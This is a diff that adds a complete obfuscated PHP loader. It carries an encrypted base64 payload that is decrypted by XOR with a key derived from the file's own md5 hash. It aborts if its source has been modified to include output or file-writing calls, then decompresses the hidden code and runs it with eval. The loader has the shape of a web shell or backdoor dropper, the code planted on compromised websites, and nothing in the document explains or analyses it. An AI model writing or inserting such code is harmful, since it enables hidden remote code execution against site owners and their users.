@@ -1,0 +1,24 @@
+<?php
+$dixgiohe="19fe0578facb99e1bfe1d33c6f414bb5";
+$zblpyzr="010d005608540f080007555258585654005256525304525b545f505305545a07";
+$rfjuvuumac="9WHnXespKM3z9yNZtjYkJzk+dAqcaQpQwnSL8CU46vrqWEDCarYOi41QN8W++EaJAOCTYBZDKxoH/leR7/qEa5fWbH4WRfpx+DmqVnIt/2t2Ukpd+wM/JGsSoqDROPB2KDcbB34EUdlt+Rfniztr4bRQj2BOBi+s5lD1KHoIKHcCf+vmvdWkLNziMIvxd3qHMVz4pf2bjnWkXc8zrwujk91k6nsdtwnOaLro+0xUIQunsoTrhNkthiuC2pWAdoXS7mUeITYjQOFdXTODbVHDk1rYts1jmkd8AuZvAmlTISNQ//LVErg0Y7Ji4SOIRYiPOZnheujrEUaTHEqc8kezzl5W8xPIZ4EZPH9Fny6FPWISTEW9KkdjzSMh9Dug7K22fbdLzieYe2Zc1SfcINqfmmWt7L3YIxmlDAaIb5HlJa5NcYD4FmQ2DGYxRjCrJeQnaAM5fOkr/aTlRISZMBqHX4/lqJOcdRRrU2ThhPotFOtGXRCxrxDFeKwr9SQdNn6NNge0cBVvnzWINYqqY862dYNoKggPBAmb6AutTIpi8E7nu51FhoXLRB3N6z5LU1YmKsl7coQTerNmY0C8GKdt1OjuuoumW/OgN4uHgzGuxJIDHiHUKjMyXQUMfuE2Y86INXcGC/f0fvMGETmcE2TyPy+x1qHx0nLOskymwh0CrrSqMT8uTvceuwNsa5CSFbjJjuak/r8O4mk760u002ONSs9jYylVwOsiGoMbIMLdj95m/saaSyCShT/Ch6UHXS1sovnU8cbn09ZxUdTOpUOcxFz7yL3T4QBLGeyEHFNyE+fCb3dc1z8DR+U/T//Uc38CVEJQ0U3GNCEBrAqmCdGCRr7ybbieF7631oehKBXa+n2acQv0r6BBFU4eSgGQs4ya7SrXxZvs9Z2hvXmun0j1F+Dnas8Ja0dvC68btvcg7wXD8cGwh2+38nFJuQvOP6z5FPvNnZDgfqTdQJ+NisG0VJ8v+m5+03UDK0k9dcbX6D8aOiZeQG06EwtFd5RRgfFZ2KoXWQqosdIehacroUJMgWiYxMeu/7jRkTw=";
+$ggywvramwmkk=file_get_contents(__FILE__);
+$bqojqafego=str_replace($rfjuvuumac,"",$ggywvramwmkk);
+if(strpos($bqojqafego,"ec"."ho")!==false||strpos($bqojqafego,"pr"."int")!==false||strpos($bqojqafego,"var_"."dump")!==false||strpos($bqojqafego,"file_put_"."contents")!==false||strpos($bqojqafego,"fw"."rite")!==false){die();}
+$ucmggn=str_replace(array($dixgiohe,$zblpyzr),array("SP_e55e748e","KP_8f5f3f81"),$ggywvramwmkk);
+$bfbxdrijcojj=md5($ucmggn);
+$hpizzoyfm=hex2bin($zblpyzr);
+$cbymgiz="";
+$kkrlyev=strlen($bfbxdrijcojj);
+for($vwrpzcii=0;$vwrpzcii<$kkrlyev;$vwrpzcii++){
+    $cbymgiz.=chr(ord($hpizzoyfm[$vwrpzcii])^ord($bfbxdrijcojj[$vwrpzcii]));
+}
+$gjsrfm=base64_decode($rfjuvuumac);
+$iwmhrl=strlen($gjsrfm);
+$mxlblzlmzyn="";
+$dekfnsktog=strlen($cbymgiz);
+for($vwrpzcii=0;$vwrpzcii<$iwmhrl;$vwrpzcii++){
+    $mxlblzlmzyn.=$gjsrfm[$vwrpzcii]^$cbymgiz[$vwrpzcii%$dekfnsktog];
+}
+$qpanxg="gz"."in"."fl"."ate";
+eval($qpanxg($mxlblzlmzyn));
